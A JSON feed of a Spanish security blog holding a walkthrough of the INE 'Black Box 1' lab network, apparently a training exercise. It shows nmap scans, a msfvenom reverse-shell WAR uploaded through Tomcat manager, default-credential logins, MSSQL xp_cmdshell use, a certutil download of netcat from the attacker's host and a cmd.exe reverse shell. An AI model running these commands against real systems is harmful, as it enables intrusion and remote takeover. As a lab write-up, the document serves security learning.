{
    "version": "https://jsonfeed.org/version/1",
    "title": "BinLAB",
    "home_page_url": "https://binlaab.github.io/",
    "feed_url": "https://binlaab.github.io/feed.json",
    "description": "mi blog, nada más",
    "icon": "https://binlaab.github.io/apple-touch-icon.png",
    "favicon": "https://binlaab.github.io/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "p0wex",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://binlaab.github.io/2021/09/08/ine-black-box-1",
            "title": Ine Black Box 1,
            "summary": null,
            "content_text": "Black Box 1 de 3 del Starter Pass de INE. En este caso estamos en un segmento de red 172.16.64.0/24(abarca desde la 172.16.64.0 hasta la 172.16.64.255)1 - Reconocimiento inicial2 - Explotamos la 172.16.64.1013 - Reconocimiento de 172.16.64.140 y explotación de 172.16.64.1994 - Credenciales ocultas para 172.16.64.182Reconocimiento inicialYa que no tenemos una IP en específico para atacar, tocará hacer un escaneo de nmapa todo el segmento de red.# Nmap 7.92 scan initiated Wed Sep  8 12:12:56 2021 as: nmap -p- --open -sC -sV -sS --min-rate 3000 -n -oN scan 172.16.64.0/24Nmap scan report for 172.16.64.101Host is up (0.17s latency).Not shown: 65529 closed tcp ports (reset), 2 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA)|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA)|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519)8080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1|_http-title: Apache2 Ubuntu Default Page: It works| http-methods: |_  Potentially risky methods: PUT DELETE|_http-server-header: Apache-Coyote/1.19080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1| http-methods: |_  Potentially risky methods: PUT DELETE|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache-Coyote/1.159919/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)MAC Address: 00:50:56:A2:EC:AA (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNmap scan report for 172.16.64.140Host is up (0.20s latency).Not shown: 65478 closed tcp ports (reset), 56 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-title: 404 HTML Template by Colorlib|_http-server-header: Apache/2.4.18 (Ubuntu)MAC Address: 00:50:56:A2:E5:76 (VMware)Nmap scan report for 172.16.64.182Host is up (0.16s latency).Not shown: 65420 closed tcp ports (reset), 114 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA)|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA)|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519)MAC Address: 00:50:56:A2:5E:B5 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNmap scan report for 172.16.64.199Host is up (0.16s latency).Not shown: 65522 closed tcp ports (reset)PORT      STATE SERVICE       VERSION135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds?1433/tcp  open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000.00; RTM| ms-sql-ntlm-info: |   Target_Name: WIN10|   NetBIOS_Domain_Name: WIN10|   NetBIOS_Computer_Name: WIN10|   DNS_Domain_Name: WIN10|   DNS_Computer_Name: WIN10|_  Product_Version: 10.0.10586|_ssl-date: 2021-09-08T10:16:07+00:00; +2s from scanner time.| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2021-09-08T08:07:38|_Not valid after:  2051-09-08T08:07:387680/tcp  open  pando-pub?49664/tcp open  msrpc         Microsoft Windows RPC49665/tcp open  msrpc         Microsoft Windows RPC49666/tcp open  msrpc         Microsoft Windows RPC49667/tcp open  msrpc         Microsoft Windows RPC49668/tcp open  msrpc         Microsoft Windows RPC49669/tcp open  msrpc         Microsoft Windows RPC49670/tcp open  msrpc         Microsoft Windows RPC49943/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2021-09-08T08:07:38|_Not valid after:  2051-09-08T08:07:38|_ssl-date: 2021-09-08T10:16:07+00:00; +2s from scanner time.| ms-sql-ntlm-info: |   Target_Name: WIN10|   NetBIOS_Domain_Name: WIN10|   NetBIOS_Computer_Name: WIN10|   DNS_Domain_Name: WIN10|   DNS_Computer_Name: WIN10|_  Product_Version: 10.0.10586MAC Address: 00:50:56:A2:0A:0F (VMware)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| ms-sql-info: |   172.16.64.199:1433: |     Version: |       name: Microsoft SQL Server 2014 RTM|       number: 12.00.2000.00|       Product: Microsoft SQL Server 2014|       Service pack level: RTM|       Post-SP patches applied: false|_    TCP port: 1433|_nbstat: NetBIOS name: WIN10, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:a2:0a:0f (VMware)|_clock-skew: mean: 1s, deviation: 0s, median: 1s| smb2-security-mode: |   3.1.1: |_    Message signing enabled but not required| smb2-time: |   date: 2021-09-08T10:15:58|_  start_date: 2021-09-08T08:07:22Post-scan script results:| ssh-hostkey: Possible duplicate hosts| Key 2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 (RSA) used by:|   172.16.64.101|   172.16.64.182| Key 256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 (ECDSA) used by:|   172.16.64.101|   172.16.64.182| Key 256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 (ED25519) used by:|   172.16.64.101|_  172.16.64.182Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Sep  8 12:16:08 2021 -- 256 IP addresses (5 hosts up) scanned in 191.45 secondsPuertos abiertosBueno, tenemos 4 hosts disponibles con algunos puertos abiertos:  172.16.64.101            Puerto      Servicio                  22      SSH, para obtener una shell segura              8080      Apache Tomcat              9080      Otro Apache Tomcat              59919      Apache 2.4.18        172.16.64.140            Puerto      Servicio                  80      Apache 2.4.18        172.16.64.182            Puerto      Servicio                  22      SSH, para obtener una shell segura        172.16.64.199            Puerto      Servicio                  135      msrpc              139      SMB, recursos compartidos del sistema              445      SMB, recursos compartidos del sistema              1433      MicroSoft SQL              7680      pando-pub(ni idea)              49664-49670      msrpc              49943      MicroSoft SQL(otra vez)      Como he hecho un escaneo de la versión y el servicio además de lanzar unos scripts básicos de enumeración en el mismo escaneo, ya no necesito usar herramientas como extractPorts.Explotación de la 172.16.64.101Teniendo todos los puertos podríamos empezar por la .101 por ejemplo. Si abrimos Firefox y entramos a los puertos de los servidores HTTP encontramos la misma página: Explotación de un Apache TomcatLos servidores Apache Tomcat(puertos 8080 y 9080) tienen la ruta /manager/html, que te da acceso a la administración del sitio.:/ No tenemos credenciales.Si le damos a cancelar, nos lleva a una página con un 401 Unauthorized y unas credenciales:Y si las introducimos tenemos acceso a la administración del sitio.Aquí puedes subir archivos .war que pueden ser maliciosos, así que podríamos obtener una reverse shell :0msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=443 -f war &gt; eeeee.warGeneramos un archivo .war llamado eeeee.war y lo subimos a la página web usando la sección de DeployCuando le demos a Deploy aparecerá el nombre de nuestro archivo listado en Applications, pero antes vamos a la consola y abrimos un listener de netcat en el puerto 443con nc -nlvp 443, y entonces le damos a nuestro archivo y conseguimos una reverse shell como el usuario tomcat8.ncat -nlvp 443Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 172.16.64.101.Ncat: Connection from 172.16.64.101:39542.whoamitomcat8Para tener una consola totalmente interactiva, tendríamos que hacer un tratamiento de la TTY.Ahora, hay que dirigirse a /home para recoger las flags de esta máquina, ubicadas en /home/adminels/Desktop y en /home/developerReconocimiento de 172.16.64.140 y explotación de 172.16.64.199Tras comprometer la 172.16.64.101, nos dirigimos a la 172.16.64.140, que tiene un servidor HTTP corriendo el el puerto 80, así que vamos a fuzzearlo con la herramienta wfuzz a ver si encontramos algo. wfuzz -c --hc=404 -t 75 -w /usr/share/wordlists/directory-list-2.3-medium.txt 172.16.64.140/FUZZ********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://172.16.64.140/FUZZTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================000000039:   301        9 L      28 W       312 Ch      \"img\"000000553:   401        14 L     54 W       460 Ch      \"project\"000000550:   301        9 L      28 W       312 Ch      \"css\"Total time: 28.95585Processed Requests: 7961Filtered Requests: 7944Requests/sec.: 274.9357Entre todos, el que destaca es /project, si vamos ahí nos encontramos con un inicio de sesión.Si introducimos las credenciales admin:admin nos autentica en la esta web, que está configurada por defecto.Si hacemos fuzzing a /project con las credenciales admin:admin para autenticarnos(o el header “Authorization: Basic YWRtaW46YWRtaW4=”) encontramos /backup, y si volvemos a fuzzear en /backup encontramos /test, donde hay unos documentos de texto.Solo el tercero/sdadas.txt contiene unas credenciales para un servidor MSSQL(ubicado en la 172.16.64.199) y una ruta con una de las flags que hay que conseguir, que estaría en http://172.16.64.140/project/354253425234234/flag.txtConseguimos acceso a la 172.16.64.199Ahora que tenemos credenciales para el servidor MSSQL del puerto 1433, podemos usar la herramienta mssqlclient.py de Impacket para conectarnos con las credenciales fooadmin:fooadmin❯ mssqlclient.py fooadmin:fooadmin@172.16.64.199Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(WIN10\\FOOSQL): Line 1: Changed database context to 'master'.[*] INFO(WIN10\\FOOSQL): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)[!] Press help for extra shell commandsSQL&gt;Y así llegamos al servidor SQL, del cual podemos sacar una shell con xp_cmdshell. Si escribimos “help” nos muestra una lista de comandos:SQL&gt; help     lcd {path}                 - changes the current local directory to {path}     exit                       - terminates the server process (and this session)     enable_xp_cmdshell         - you know what it means     disable_xp_cmdshell        - you know what it means     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)     ! {cmd}                    - executes a local shell cmdHabilitamos la consola con enable_xp_cmdshell y ejecutamos comandos con xp_cmdshell. Ya que no tenemos formas de enviarnos una reverse shell sin ningún programa, descargué un binario compilado de netcat(en Kali/Parrot hay uno) y mediante un servidor HTTP con Python y certutil.exe, me lo pude descargar y enviarme un cmd.exe a mi equipo.Primero, creamos un servidor con Python en el puerto 80(si no sois root necesitaréis sudo) usando la librería http de esta forma: python3 -m http.server 80 y usando certutil.exe lo descargamos en la máquinacon el comando certutil.exe -urlcache -f http://tuip/nc.exe nc.exeTras haberlo descargado, solo habría que ejecutarlo y con el parámetro -e enviar un cmd.exe a tu ip y el puerto en el que estés escuchando para conseguir acceso a esta máquina.rlwrap ncat -nlvp 443Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 172.16.64.199.Ncat: Connection from 172.16.64.199:49678.Microsoft Windows [Version 10.0.10586](c) 2015 Microsoft Corporation. All rights reserved.whoamint authority\\systemCredenciales para la 172.16.64.182Y así, estamos casi metidos hasta la cocina, ya que nos faltaría una máquina por comprometer, la 172.16.64.182, que solo tiene el puerto 22 abierto.Si miramos en el directorio Users encontramos varios usuarios, la flag está en C:\\Users\\AdminELS\\Desktop, junto con lo que supuestamente es una clave pública de SSH:type id_rsa.pub&lt;texto de relleno&gt;jUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22################&lt;relleno&gt;Pero si la miramos de cerca vemos unas credenciales para la máquina que falta por comprometer, que serían las credenciales developer:dF3334slKw. Si entramos por SSH a la 172.16.64.182, veremos la última flag y habremos comprometido todas las máquinas de esta Black Box.Si te ha gustado puedes ir a mi github y darme una estrellita :)",
            "content_html": "<p>Black Box 1 de 3 del Starter Pass de INE. En este caso estamos en un segmento de red 172.16.64.0/24(abarca desde la 172.16.64.0 hasta la 172.16.64.255)</p><p>1 - <a href=\"#recon\">Reconocimiento inicial</a></p><p>2 - <a href=\"#maquina1\">Explotamos la 172.16.64.101</a></p><p>3 - <a href=\"#maquina2\">Reconocimiento de 172.16.64.140 y explotación de 172.16.64.199</a></p><p>4 - <a href=\"#maquina3\">Credenciales ocultas para 172.16.64.182</a></p><h1 id=\"recon\">Reconocimiento inicial</h1><p>Ya que no tenemos una IP en específico para atacar, tocará hacer un escaneo de <code class=\"language-plaintext highlighter-rouge\">nmap</code>a todo el segmento de red.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nmap 7.92 scan initiated Wed Sep  8 12:12:56 2021 as: nmap -p- --open -sC -sV -sS --min-rate 3000 -n -oN scan 172.16.64.0/24</span>Nmap scan report <span class=\"k\">for </span>172.16.64.101Host is up <span class=\"o\">(</span>0.17s latency<span class=\"o\">)</span><span class=\"nb\">.</span>Not shown: 65529 closed tcp ports <span class=\"o\">(</span>reset<span class=\"o\">)</span>, 2 filtered tcp ports <span class=\"o\">(</span>no-response<span class=\"o\">)</span>Some closed ports may be reported as filtered due to <span class=\"nt\">--defeat-rst-ratelimit</span>PORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class=\"o\">(</span>Ubuntu Linux<span class=\"p\">;</span> protocol 2.0<span class=\"o\">)</span>| ssh-hostkey: |   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 <span class=\"o\">(</span>RSA<span class=\"o\">)</span>|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 <span class=\"o\">(</span>ECDSA<span class=\"o\">)</span>|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 <span class=\"o\">(</span>ED25519<span class=\"o\">)</span>8080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1|_http-title: Apache2 Ubuntu Default Page: It works| http-methods: |_  Potentially risky methods: PUT DELETE|_http-server-header: Apache-Coyote/1.19080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1| http-methods: |_  Potentially risky methods: PUT DELETE|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache-Coyote/1.159919/tcp open  http    Apache httpd 2.4.18 <span class=\"o\">((</span>Ubuntu<span class=\"o\">))</span>|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 <span class=\"o\">(</span>Ubuntu<span class=\"o\">)</span>MAC Address: 00:50:56:A2:EC:AA <span class=\"o\">(</span>VMware<span class=\"o\">)</span>Service Info: OS: Linux<span class=\"p\">;</span> CPE: cpe:/o:linux:linux_kernelNmap scan report <span class=\"k\">for </span>172.16.64.140Host is up <span class=\"o\">(</span>0.20s latency<span class=\"o\">)</span><span class=\"nb\">.</span>Not shown: 65478 closed tcp ports <span class=\"o\">(</span>reset<span class=\"o\">)</span>, 56 filtered tcp ports <span class=\"o\">(</span>no-response<span class=\"o\">)</span>Some closed ports may be reported as filtered due to <span class=\"nt\">--defeat-rst-ratelimit</span>PORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 <span class=\"o\">((</span>Ubuntu<span class=\"o\">))</span>|_http-title: 404 HTML Template by Colorlib|_http-server-header: Apache/2.4.18 <span class=\"o\">(</span>Ubuntu<span class=\"o\">)</span>MAC Address: 00:50:56:A2:E5:76 <span class=\"o\">(</span>VMware<span class=\"o\">)</span>Nmap scan report <span class=\"k\">for </span>172.16.64.182Host is up <span class=\"o\">(</span>0.16s latency<span class=\"o\">)</span><span class=\"nb\">.</span>Not shown: 65420 closed tcp ports <span class=\"o\">(</span>reset<span class=\"o\">)</span>, 114 filtered tcp ports <span class=\"o\">(</span>no-response<span class=\"o\">)</span>Some closed ports may be reported as filtered due to <span class=\"nt\">--defeat-rst-ratelimit</span>PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class=\"o\">(</span>Ubuntu Linux<span class=\"p\">;</span> protocol 2.0<span class=\"o\">)</span>| ssh-hostkey: |   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 <span class=\"o\">(</span>RSA<span class=\"o\">)</span>|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 <span class=\"o\">(</span>ECDSA<span class=\"o\">)</span>|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 <span class=\"o\">(</span>ED25519<span class=\"o\">)</span>MAC Address: 00:50:56:A2:5E:B5 <span class=\"o\">(</span>VMware<span class=\"o\">)</span>Service Info: OS: Linux<span class=\"p\">;</span> CPE: cpe:/o:linux:linux_kernelNmap scan report <span class=\"k\">for </span>172.16.64.199Host is up <span class=\"o\">(</span>0.16s latency<span class=\"o\">)</span><span class=\"nb\">.</span>Not shown: 65522 closed tcp ports <span class=\"o\">(</span>reset<span class=\"o\">)</span>PORT      STATE SERVICE       VERSION135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds?1433/tcp  open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000.00<span class=\"p\">;</span> RTM| ms-sql-ntlm-info: |   Target_Name: WIN10|   NetBIOS_Domain_Name: WIN10|   NetBIOS_Computer_Name: WIN10|   DNS_Domain_Name: WIN10|   DNS_Computer_Name: WIN10|_  Product_Version: 10.0.10586|_ssl-date: 2021-09-08T10:16:07+00:00<span class=\"p\">;</span> +2s from scanner time.| ssl-cert: Subject: <span class=\"nv\">commonName</span><span class=\"o\">=</span>SSL_Self_Signed_Fallback| Not valid before: 2021-09-08T08:07:38|_Not valid after:  2051-09-08T08:07:387680/tcp  open  pando-pub?49664/tcp open  msrpc         Microsoft Windows RPC49665/tcp open  msrpc         Microsoft Windows RPC49666/tcp open  msrpc         Microsoft Windows RPC49667/tcp open  msrpc         Microsoft Windows RPC49668/tcp open  msrpc         Microsoft Windows RPC49669/tcp open  msrpc         Microsoft Windows RPC49670/tcp open  msrpc         Microsoft Windows RPC49943/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000| ssl-cert: Subject: <span class=\"nv\">commonName</span><span class=\"o\">=</span>SSL_Self_Signed_Fallback| Not valid before: 2021-09-08T08:07:38|_Not valid after:  2051-09-08T08:07:38|_ssl-date: 2021-09-08T10:16:07+00:00<span class=\"p\">;</span> +2s from scanner time.| ms-sql-ntlm-info: |   Target_Name: WIN10|   NetBIOS_Domain_Name: WIN10|   NetBIOS_Computer_Name: WIN10|   DNS_Domain_Name: WIN10|   DNS_Computer_Name: WIN10|_  Product_Version: 10.0.10586MAC Address: 00:50:56:A2:0A:0F <span class=\"o\">(</span>VMware<span class=\"o\">)</span>Service Info: OS: Windows<span class=\"p\">;</span> CPE: cpe:/o:microsoft:windowsHost script results:| ms-sql-info: |   172.16.64.199:1433: |     Version: |       name: Microsoft SQL Server 2014 RTM|       number: 12.00.2000.00|       Product: Microsoft SQL Server 2014|       Service pack level: RTM|       Post-SP patches applied: <span class=\"nb\">false</span>|_    TCP port: 1433|_nbstat: NetBIOS name: WIN10, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:a2:0a:0f <span class=\"o\">(</span>VMware<span class=\"o\">)</span>|_clock-skew: mean: 1s, deviation: 0s, median: 1s| smb2-security-mode: |   3.1.1: |_    Message signing enabled but not required| smb2-time: |   <span class=\"nb\">date</span>: 2021-09-08T10:15:58|_  start_date: 2021-09-08T08:07:22Post-scan script results:| ssh-hostkey: Possible duplicate hosts| Key 2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 <span class=\"o\">(</span>RSA<span class=\"o\">)</span> used by:|   172.16.64.101|   172.16.64.182| Key 256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 <span class=\"o\">(</span>ECDSA<span class=\"o\">)</span> used by:|   172.16.64.101|   172.16.64.182| Key 256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 <span class=\"o\">(</span>ED25519<span class=\"o\">)</span> used by:|   172.16.64.101|_  172.16.64.182Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class=\"nb\">.</span><span class=\"c\"># Nmap done at Wed Sep  8 12:16:08 2021 -- 256 IP addresses (5 hosts up) scanned in 191.45 seconds</span></code></pre></div></div><h2 id=\"puertos-abiertos\">Puertos abiertos</h2><p>Bueno, tenemos 4 hosts disponibles con algunos puertos abiertos:</p><ul>  <li>172.16.64.101</li></ul><table>  <thead>    <tr>      <th>Puerto</th>      <th>Servicio</th>    </tr>  </thead>  <tbody>    <tr>      <td>22</td>      <td>SSH, para obtener una shell segura</td>    </tr>    <tr>      <td>8080</td>      <td>Apache Tomcat</td>    </tr>    <tr>      <td>9080</td>      <td>Otro Apache Tomcat</td>    </tr>    <tr>      <td>59919</td>      <td>Apache 2.4.18</td>    </tr>  </tbody></table><p><br /></p><ul>  <li>172.16.64.140</li></ul><table>  <thead>    <tr>      <th>Puerto</th>      <th>Servicio</th>    </tr>  </thead>  <tbody>    <tr>      <td>80</td>      <td>Apache 2.4.18</td>    </tr>  </tbody></table><p><br /></p><ul>  <li>172.16.64.182</li></ul><table>  <thead>    <tr>      <th>Puerto</th>      <th>Servicio</th>    </tr>  </thead>  <tbody>    <tr>      <td>22</td>      <td>SSH, para obtener una shell segura</td>    </tr>  </tbody></table><p><br /></p><ul>  <li>172.16.64.199</li></ul><table>  <thead>    <tr>      <th>Puerto</th>      <th>Servicio</th>    </tr>  </thead>  <tbody>    <tr>      <td>135</td>      <td>msrpc</td>    </tr>    <tr>      <td>139</td>      <td>SMB, recursos compartidos del sistema</td>    </tr>    <tr>      <td>445</td>      <td>SMB, recursos compartidos del sistema</td>    </tr>    <tr>      <td>1433</td>      <td>MicroSoft SQL</td>    </tr>    <tr>      <td>7680</td>      <td>pando-pub(ni idea)</td>    </tr>    <tr>      <td>49664-49670</td>      <td>msrpc</td>    </tr>    <tr>      <td>49943</td>      <td>MicroSoft SQL(otra vez)</td>    </tr>  </tbody></table><p>Como he hecho un escaneo de la versión y el servicio además de lanzar unos scripts básicos de enumeración en el mismo escaneo, ya no necesito usar herramientas como <a href=\"https://pastebin.com/tYpwpauW\">extractPorts</a>.</p><h1 id=\"maquina1\">Explotación de la 172.16.64.101</h1><p>Teniendo todos los puertos podríamos empezar por la .101 por ejemplo. Si abrimos Firefox y entramos a los puertos de los servidores HTTP encontramos la misma página: <img src=\"https://user-images.githubusercontent.com/71317374/132499799-309aa1a6-7ee5-4d28-bfe8-7eda222d89a4.png\" alt=\"imagen\" /></p><h2 id=\"explotación-de-un-apache-tomcat\">Explotación de un Apache Tomcat</h2><p>Los servidores Apache Tomcat(puertos 8080 y 9080) tienen la ruta /manager/html, que te da acceso a la administración del sitio.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/132499957-ac6e1dc9-9daa-4e50-9483-14953156a10e.png\" alt=\"imagen\" /></p><p>:/ No tenemos credenciales.</p><p>Si le damos a cancelar, nos lleva a una página con un 401 Unauthorized y unas credenciales:</p><p><img src=\"https://user-images.githubusercontent.com/71317374/132500059-7ae5f09f-6240-436a-9bdc-639b997d6ac3.png\" alt=\"imagen\" /></p><p>Y si las introducimos tenemos acceso a la administración del sitio.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/132500156-bb495740-c4c6-4e42-bf51-1fbabcb1a18d.png\" alt=\"imagen\" /></p><p>Aquí puedes subir archivos .war que pueden ser maliciosos, así que podríamos obtener una reverse shell :0</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>msfvenom <span class=\"nt\">-p</span> java/jsp_shell_reverse_tcp <span class=\"nv\">LHOST</span><span class=\"o\">=</span>172.16.64.10 <span class=\"nv\">LPORT</span><span class=\"o\">=</span>443 <span class=\"nt\">-f</span> war <span class=\"o\">&gt;</span> eeeee.war</code></pre></div></div><p>Generamos un archivo .war llamado eeeee.war y lo subimos a la página web usando la sección de Deploy</p><p><img src=\"https://user-images.githubusercontent.com/71317374/132502557-3c8dffe0-a5ff-4b5a-9ac4-ad7f4497c30d.png\" alt=\"imagen\" /></p><p>Cuando le demos a Deploy aparecerá el nombre de nuestro archivo listado en Applications, pero antes vamos a la consola y abrimos un listener de netcat en el puerto 443con <code class=\"language-plaintext highlighter-rouge\">nc -nlvp 443</code>, y entonces le damos a nuestro archivo y conseguimos una reverse shell como el usuario tomcat8.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>ncat <span class=\"nt\">-nlvp</span> 443Ncat: Version 7.92 <span class=\"o\">(</span> https://nmap.org/ncat <span class=\"o\">)</span>Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 172.16.64.101.Ncat: Connection from 172.16.64.101:39542.<span class=\"nb\">whoami</span>tomcat8</code></pre></div></div><p>Para tener una consola totalmente interactiva, tendríamos que hacer un <a href=\"https://www.thehackersnow.com/tratamiento-de-una-tty/\">tratamiento de la TTY</a>.Ahora, hay que dirigirse a /home para recoger las flags de esta máquina, ubicadas en /home/adminels/Desktop y en /home/developer</p><h1 id=\"maquina2\">Reconocimiento de 172.16.64.140 y explotación de 172.16.64.199</h1><p>Tras comprometer la 172.16.64.101, nos dirigimos a la 172.16.64.140, que tiene un servidor HTTP corriendo el el puerto 80, así que vamos a fuzzearlo con la herramienta <code class=\"language-plaintext highlighter-rouge\">wfuzz</code> a ver si encontramos algo.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> wfuzz <span class=\"nt\">-c</span> <span class=\"nt\">--hc</span><span class=\"o\">=</span>404 <span class=\"nt\">-t</span> 75 <span class=\"nt\">-w</span> /usr/share/wordlists/directory-list-2.3-medium.txt 172.16.64.140/FUZZ<span class=\"k\">********************************************************</span><span class=\"k\">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class=\"k\">*</span><span class=\"k\">********************************************************</span>Target: http://172.16.64.140/FUZZTotal requests: 220560<span class=\"o\">=====================================================================</span>ID           Response   Lines    Word       Chars       Payload<span class=\"o\">=====================================================================</span>000000039:   301        9 L      28 W       312 Ch      <span class=\"s2\">\"img\"</span>000000553:   401        14 L     54 W       460 Ch      <span class=\"s2\">\"project\"</span>000000550:   301        9 L      28 W       312 Ch      <span class=\"s2\">\"css\"</span>Total <span class=\"nb\">time</span>: 28.95585Processed Requests: 7961Filtered Requests: 7944Requests/sec.: 274.9357</code></pre></div></div><p>Entre todos, el que destaca es /project, si vamos ahí nos encontramos con un inicio de sesión.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/132509149-aab25095-2e71-44b7-930f-39a153fd6d43.png\" alt=\"imagen\" /></p><p>Si introducimos las credenciales admin:admin nos autentica en la esta web, que está configurada por defecto.Si hacemos fuzzing a /project con las credenciales admin:admin para autenticarnos(o el header “Authorization: Basic YWRtaW46YWRtaW4=”) encontramos /backup, y si volvemos a fuzzear en /backup encontramos /test, donde hay unos documentos de texto.</p><p>Solo el tercero/sdadas.txt contiene unas credenciales para un servidor MSSQL(ubicado en la 172.16.64.199) y una ruta con una de las flags que hay que conseguir, que estaría en http://172.16.64.140/project/354253425234234/flag.txt</p><h2 id=\"conseguimos-acceso-a-la-1721664199\">Conseguimos acceso a la 172.16.64.199</h2><p>Ahora que tenemos credenciales para el servidor MSSQL del puerto 1433, podemos usar la herramienta <a href=\"https://github.com/secureauthcorp/impacket/blob/master/examples/mssqlclient.py\">mssqlclient.py</a> de Impacket para conectarnos con las credenciales fooadmin:fooadmin</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>❯ mssqlclient.py fooadmin:fooadmin@172.16.64.199Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Encryption required, switching to TLS<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> ENVCHANGE<span class=\"o\">(</span>DATABASE<span class=\"o\">)</span>: Old Value: master, New Value: master<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> ENVCHANGE<span 